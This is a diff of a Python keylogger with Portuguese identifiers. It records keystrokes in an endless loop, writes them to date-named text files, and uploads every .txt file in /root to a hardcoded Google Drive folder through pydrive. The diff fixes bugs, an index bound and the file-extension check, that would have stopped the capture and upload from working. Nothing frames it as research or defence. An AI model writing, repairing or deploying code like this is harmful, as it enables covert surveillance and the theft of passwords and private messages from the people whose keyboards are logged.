@@ -1,15 +1,19 @@
 import keyboard
 
+
 def gerar_nome():
     import datetime
     import random
-    direita = ('breu','escuro','obscuro','trevas','sombra','caligem', 'neblina', 'blecaute', 'apagao', 'opaco', 'tenebroso')
+    direita = (
+    'breu', 'escuro', 'obscuro', 'trevas', 'sombra', 'caligem', 'neblina', 'blecaute', 'apagao', 'opaco', 'tenebroso')
     name = datetime.date
     name = str(name.today())
 
-    return name + '-' + direita[random.randint(0,11)]
+    return name + '-' + direita[random.randint(0, 10)]
+
 
 arquivo = gerar_nome() + '.txt'
+
 
 def google_drive():
     from pydrive.auth import GoogleAuth
@@ -21,20 +25,22 @@ def google_drive():
 
     folder = '1OvHDaMSzesRWVOC8seuTu7qVLfkmBiu8'
 
-    directory = '/root'
+    diretorio = '/root'
 
-    for f in os.listdir(directory):
-        filename = os.path.join(directory, f)
-        if filename[-3] == 'txt':
-            gfile = drive.CreateFile({'parents': [{'id': folder}], 'title': f})
+    arquivos = os.listdir(diretorio)
+
+    for arquivo in arquivos:
+        if arquivo[-3:] == "txt":
+            filename = diretorio + '/' + arquivo
+            gfile = drive.CreateFile({'parents': [{'id': folder}], 'title': arquivo})
             gfile.SetContentFile(filename)
             gfile.Upload()
 
+
 while True:
     frase = ''
-    teclas = [[],[]]
-    t = keyboard.record(until= 'return')
-
+    teclas = [[], []]
+    t = keyboard.record(until='return')
 
     for tecla in t:
         convertido = str(tecla)
@@ -43,7 +49,6 @@ while True:
             teclas[0].append(filtro)
         else:
             teclas[1].append(filtro)
-
 
     for letra in teclas[0]:
         if letra[0] == 'space':
